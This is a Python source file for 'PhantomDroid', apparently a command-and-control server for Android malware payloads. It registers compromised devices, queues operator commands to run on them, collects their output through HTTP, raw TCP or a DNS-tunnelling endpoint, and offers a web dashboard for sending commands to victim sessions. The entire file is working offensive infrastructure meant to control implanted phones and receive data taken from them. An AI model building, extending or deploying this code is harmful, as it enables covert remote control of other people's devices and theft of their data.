#!/usr/bin/env python3
"""
PhantomDroid Framework v2.0 - Command & Control Server
Advanced C2 server with multiple protocols and stealth features
Author: M DHARAN RAJ - Web Developer & Ethical Hacker
"""

import os
import sys
import json
import time
import base64
import socket
import threading
import argparse
from datetime import datetime
from pathlib import Path
from flask import Flask, request, jsonify, render_template_string
from cryptography.fernet import Fernet
import sqlite3

class PhantomC2Server:
    def __init__(self, port=8080, protocol="1", log_dir="logs"):
        self.port = port
        self.protocol = protocol
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(parents=True, exist_ok=True)
        
        # Initialize Flask app
        self.app = Flask(__name__)
        self.app.secret_key = os.urandom(24)
        
        # Active sessions
        self.sessions = {}
        self.session_lock = threading.Lock()
        
        # Command queue
        self.command_queue = {}
        self.response_queue = {}
        
        # Initialize database
        self.init_database()
        
        # Setup routes
        self.setup_routes()
        
        # Encryption key for secure communications
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
        
    def _log(self, level, message, session_id=None):
        """Enhanced logging function"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        session_info = f" [Session: {session_id}]" if session_id else ""
        log_message = f"[{timestamp}] [{level}]{session_info} {message}"
        
        print(log_message)
        
        # Write to log file
        log_file = self.log_dir / "c2_server.log"
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(log_message + '\n')
    
    def init_database(self):
        """Initialize SQLite database for session management"""
        db_path = self.log_dir / "phantom_c2.db"
        
        conn = sqlite3.connect(str(db_path))
        cursor = conn.cursor()
        
        # Create tables
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY,
                ip_address TEXT,
                user_agent TEXT,
                first_seen TIMESTAMP,
                last_seen TIMESTAMP,
                device_info TEXT,
                status TEXT DEFAULT 'active'
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                command TEXT,
                timestamp TIMESTAMP,
                status TEXT DEFAULT 'pending'
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS responses (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                command_id INTEGER,
                session_id TEXT,
                response TEXT,
                timestamp TIMESTAMP
            )
        ''')
        
        conn.commit()
        conn.close()
        
        self._log("INFO", "Database initialized")
    
    def register_session(self, session_id, ip_address, user_agent, device_info=None):
        """Register new session"""
        try:
            db_path = self.log_dir / "phantom_c2.db"
            conn = sqlite3.connect(str(db_path))
            cursor = conn.cursor()
            
            # Check if session exists
            cursor.execute('SELECT id FROM sessions WHERE id = ?', (session_id,))
            if cursor.fetchone():
                # Update existing session
                cursor.execute('''
                    UPDATE sessions 
                    SET last_seen = ?, status = 'active'
                    WHERE id = ?
                ''', (datetime.now(), session_id))
            else:
                # Create new session
                cursor.execute('''
                    INSERT INTO sessions (id, ip_address, user_agent, first_seen, last_seen, device_info)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (session_id, ip_address, user_agent, datetime.now(), datetime.now(), device_info))
            
            conn.commit()
            conn.close()
            
            with self.session_lock:
                self.sessions[session_id] = {
                    'ip': ip_address,
                    'user_agent': user_agent,
                    'last_seen': datetime.now(),
                    'device_info': device_info
                }
            
            self._log("INFO", f"Session registered: {ip_address}", session_id)
            
        except Exception as e:
            self._log("ERROR", f"Session registration failed: {e}")
    
    def setup_routes(self):
        """Setup Flask routes for different protocols"""
        
        @self.app.route('/')
        def index():
            """Main dashboard"""
            return render_template_string(self.get_dashboard_template())
        
        @self.app.route('/api/register', methods=['POST'])
        def register():
            """Register new payload session"""
            try:
                data = request.get_json()
                session_id = data.get('session_id', self.generate_session_id())
                device_info = data.get('device_info', {})
                
                self.register_session(
                    session_id,
                    request.remote_addr,
                    request.headers.get('User-Agent', 'Unknown'),
                    json.dumps(device_info)
                )
                
                return jsonify({
                    'status': 'success',
                    'session_id': session_id,
                    'encryption_key': base64.b64encode(self.encryption_key).decode()
                })
                
            except Exception as e:
                self._log("ERROR", f"Registration failed: {e}")
                return jsonify({'status': 'error', 'message': str(e)}), 500
        
        @self.app.route('/api/cmd', methods=['GET', 'POST'])
        def command_handler():
            """Handle command requests"""
            session_id = request.args.get('session') or request.form.get('session')
            
            if not session_id:
                return jsonify({'error': 'No session ID'}), 400
            
            if request.method == 'GET':
                # Get command for session
                command = self.get_command_for_session(session_id)
                if command:
                    return jsonify({'command': command})
                else:
                    return jsonify({'command': ''})
            
            elif request.method == 'POST':
                # Receive command response
                response_data = request.get_json() or request.form.to_dict()
                response = response_data.get('response', '')
                command_id = response_data.get('command_id')
                
                self.store_response(session_id, command_id, response)
                return jsonify({'status': 'received'})
        
        @self.app.route('/api/sessions')
        def list_sessions():
            """List active sessions"""
            with self.session_lock:
                sessions_data = []
                for sid, info in self.sessions.items():
                    sessions_data.append({
                        'id': sid,
                        'ip': info['ip'],
                        'user_agent': info['user_agent'],
                        'last_seen': info['last_seen'].strftime('%Y-%m-%d %H:%M:%S'),
                        'device_info': info.get('device_info', 'Unknown')
                    })
                
                return jsonify({'sessions': sessions_data})
        
        @self.app.route('/api/execute', methods=['POST'])
        def execute_command():
            """Execute command on specific session"""
            data = request.get_json()
            session_id = data.get('session_id')
            command = data.get('command')
            
            if not session_id or not command:
                return jsonify({'error': 'Missing session_id or command'}), 400
            
            command_id = self.queue_command(session_id, command)
            return jsonify({'status': 'queued', 'command_id': command_id})
        
        @self.app.route('/dns/<path:query>')
        def dns_tunnel(query):
            """DNS tunneling endpoint"""
            # Extract session and data from DNS query
            parts = query.split('.')
            if len(parts) >= 2:
                session_id = parts[0]
                data_type = parts[1]
                
                if data_type == 'cmd':
                    # Return command
                    command = self.get_command_for_session(session_id)
                    # Encode command in DNS response (simplified)
                    return f"127.0.0.{len(command) % 256}"
                
                elif data_type == 'resp':
                    # Receive response data
                    if len(parts) > 2:
                        encoded_data = '.'.join(parts[2:])
                        try:
                            decoded_data = base64.b64decode(encoded_data).decode()
                            self.store_response(session_id, None, decoded_data)
                        except:
                            pass
                    
                    return "127.0.0.1"
            
            return "127.0.0.1"
    
    def generate_session_id(self):
        """Generate unique session ID"""
        import uuid
        return str(uuid.uuid4())[:8]
    
    def queue_command(self, session_id, command):
        """Queue command for session"""
        try:
            db_path = self.log_dir / "phantom_c2.db"
            conn = sqlite3.connect(str(db_path))
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO commands (session_id, command, timestamp)
                VALUES (?, ?, ?)
            ''', (session_id, command, datetime.now()))
            
            command_id = cursor.lastrowid
            conn.commit()
            conn.close()
            
            # Add to memory queue
            if session_id not in self.command_queue:
                self.command_queue[session_id] = []
            self.command_queue[session_id].append({
                'id': command_id,
                'command': command,
                'timestamp': datetime.now()
            })
            
            self._log("INFO", f"Command queued: {command}", session_id)
            return command_id
            
        except Exception as e:
            self._log("ERROR", f"Command queueing failed: {e}")
            return None
    
    def get_command_for_session(self, session_id):
        """Get next command for session"""
        if session_id in self.command_queue and self.command_queue[session_id]:
            command_data = self.command_queue[session_id].pop(0)
            return command_data['command']
        return None
    
    def store_response(self, session_id, command_id, response):
        """Store command response"""
        try:
            db_path = self.log_dir / "phantom_c2.db"
            conn = sqlite3.connect(str(db_path))
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO responses (command_id, session_id, response, timestamp)
                VALUES (?, ?, ?, ?)
            ''', (command_id, session_id, response, datetime.now()))
            
            conn.commit()
            conn.close()
            
            self._log("INFO", f"Response received: {response[:100]}...", session_id)
            
        except Exception as e:
            self._log("ERROR", f"Response storage failed: {e}")
    
    def get_dashboard_template(self):
        """Get HTML template for dashboard"""
        return '''
<!DOCTYPE html>
<html>
<head>
    <title>PhantomDroid C2 Server</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #1a1a1a; color: #fff; }
        .header { text-align: center; margin-bottom: 30px; }
        .logo { color: #00ff00; font-size: 24px; font-weight: bold; }
        .container { max-width: 1200px; margin: 0 auto; }
        .section { background: #2a2a2a; padding: 20px; margin: 20px 0; border-radius: 5px; }
        .sessions-table { width: 100%; border-collapse: collapse; }
        .sessions-table th, .sessions-table td { padding: 10px; border: 1px solid #444; text-align: left; }
        .sessions-table th { background: #333; }
        .command-input { width: 70%; padding: 10px; background: #333; color: #fff; border: 1px solid #555; }
        .btn { padding: 10px 20px; background: #00ff00; color: #000; border: none; cursor: pointer; }
        .btn:hover { background: #00cc00; }
        .status { padding: 5px 10px; border-radius: 3px; }
        .status.active { background: #00ff00; color: #000; }
        .status.inactive { background: #ff0000; color: #fff; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">PhantomDroid C2 Server</div>
            <p>Advanced Android Payload Command & Control</p>
        </div>
        
        <div class="section">
            <h3>Server Status</h3>
            <p>Server running on port: <strong>{{ port }}</strong></p>
            <p>Protocol: <strong>{{ protocol }}</strong></p>
            <p>Active Sessions: <strong id="session-count">0</strong></p>
        </div>
        
        <div class="section">
            <h3>Active Sessions</h3>
            <table class="sessions-table" id="sessions-table">
                <thead>
                    <tr>
                        <th>Session ID</th>
                        <th>IP Address</th>
                        <th>User Agent</th>
                        <th>Last Seen</th>
                        <th>Status</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="sessions-body">
                    <tr><td colspan="6">Loading sessions...</td></tr>
                </tbody>
            </table>
        </div>
        
        <div class="section">
            <h3>Command Execution</h3>
            <div>
                <select id="session-select" style="padding: 10px; background: #333; color: #fff; border: 1px solid #555;">
                    <option value="">Select Session</option>
                </select>
                <input type="text" id="command-input" class="command-input" placeholder="Enter command..." />
                <button class="btn" onclick="executeCommand()">Execute</button>
            </div>
            <div id="command-output" style="margin-top: 20px; padding: 10px; background: #333; border-radius: 3px; min-height: 100px; font-family: monospace;"></div>
        </div>
    </div>
    
    <script>
        function loadSessions() {
            fetch('/api/sessions')
                .then(response => response.json())
                .then(data => {
                    const tbody = document.getElementById('sessions-body');
                    const select = document.getElementById('session-select');
                    
                    tbody.innerHTML = '';
                    select.innerHTML = '<option value="">Select Session</option>';
                    
                    if (data.sessions.length === 0) {
                        tbody.innerHTML = '<tr><td colspan="6">No active sessions</td></tr>';
                    } else {
                        data.sessions.forEach(session => {
                            const row = tbody.insertRow();
                            row.innerHTML = `
                                <td>${session.id}</td>
                                <td>${session.ip}</td>
                                <td>${session.user_agent}</td>
                                <td>${session.last_seen}</td>
                                <td><span class="status active">Active</span></td>
                                <td><button class="btn" onclick="selectSession('${session.id}')">Select</button></td>
                            `;
                            
                            const option = document.createElement('option');
                            option.value = session.id;
                            option.textContent = `${session.id} (${session.ip})`;
                            select.appendChild(option);
                        });
                    }
                    
                    document.getElementById('session-count').textContent = data.sessions.length;
                })
                .catch(error => console.error('Error loading sessions:', error));
        }
        
        function selectSession(sessionId) {
            document.getElementById('session-select').value = sessionId;
        }
        
        function executeCommand() {
            const sessionId = document.getElementById('session-select').value;
            const command = document.getElementById('command-input').value;
            
            if (!sessionId || !command) {
                alert('Please select a session and enter a command');
                return;
            }
            
            fetch('/api/execute', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({session_id: sessionId, command: command})
            })
            .then(response => response.json())
            .then(data => {
                const output = document.getElementById('command-output');
                output.innerHTML += `<div>[${new Date().toLocaleTimeString()}] Command sent: ${command}</div>`;
                document.getElementById('command-input').value = '';
            })
            .catch(error => {
                console.error('Error executing command:', error);
                alert('Error executing command');
            });
        }
        
        // Auto-refresh sessions every 5 seconds
        setInterval(loadSessions, 5000);
        loadSessions();
    </script>
</body>
</html>
        '''
    
    def start_tcp_server(self):
        """Start TCP-based C2 server"""
        self._log("INFO", f"Starting TCP C2 server on port {self.port}")
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', self.port))
        sock.listen(5)
        
        while True:
            try:
                client_sock, addr = sock.accept()
                self._log("INFO", f"TCP connection from {addr}")
                
                # Handle client in separate thread
                client_thread = threading.Thread(
                    target=self.handle_tcp_client,
                    args=(client_sock, addr)
                )
                client_thread.daemon = True
                client_thread.start()
                
            except Exception as e:
                self._log("ERROR", f"TCP server error: {e}")
    
    def handle_tcp_client(self, client_sock, addr):
        """Handle TCP client connection"""
        session_id = self.generate_session_id()
        self.register_session(session_id, addr[0], "TCP Client")
        
        try:
            while True:
                # Send command if available
                command = self.get_command_for_session(session_id)
                if command:
                    client_sock.send(f"{command}\n".encode())
                
                # Receive response
                client_sock.settimeout(1.0)
                try:
                    data = client_sock.recv(4096)
                    if data:
                        response = data.decode().strip()
                        self.store_response(session_id, None, response)
                except socket.timeout:
                    continue
                except:
                    break
                
                time.sleep(1)
                
        except Exception as e:
            self._log("ERROR", f"TCP client error: {e}", session_id)
        finally:
            client_sock.close()
            self._log("INFO", f"TCP client disconnected", session_id)
    
    def start_server(self):
        """Start the C2 server based on protocol"""
        self._log("INFO", f"Starting PhantomDroid C2 Server")
        self._log("INFO", f"Protocol: {self.protocol}, Port: {self.port}")
        
        if self.protocol == "1":  # HTTP/HTTPS
            self.app.run(host='0.0.0.0', port=self.port, debug=False, threaded=True)
        elif self.protocol == "2":  # DNS Tunneling
            # Start both HTTP server for management and DNS handler
            dns_thread = threading.Thread(target=self.start_dns_server)
            dns_thread.daemon = True
            dns_thread.start()
            self.app.run(host='0.0.0.0', port=self.port, debug=False, threaded=True)
        elif self.protocol == "3":  # Multi-Protocol
            # Start TCP server in background
            tcp_thread = threading.Thread(target=self.start_tcp_server)
            tcp_thread.daemon = True
            tcp_thread.start()
            self.app.run(host='0.0.0.0', port=self.port, debug=False, threaded=True)
    
    def start_dns_server(self):
        """Start DNS server for tunneling"""
        # This would implement a full DNS server
        # For now, it's a placeholder
        self._log("INFO", "DNS tunneling server started")

def main():
    parser = argparse.ArgumentParser(description="PhantomDroid C2 Server")
    parser.add_argument("--port", type=int, default=8080, help="Server port")
    parser.add_argument("--protocol", choices=["1", "2", "3"], default="1",
                       help="Protocol (1=HTTP, 2=DNS, 3=Multi)")
    parser.add_argument("--log-dir", default="logs", help="Log directory")
    
    args = parser.parse_args()
    
    # Initialize and start server
    server = PhantomC2Server(args.port, args.protocol, args.log_dir)
    
    try:
        server.start_server()
    except KeyboardInterrupt:
        print("\nShutting down C2 server...")
        sys.exit(0)

if __name__ == "__main__":
    main()
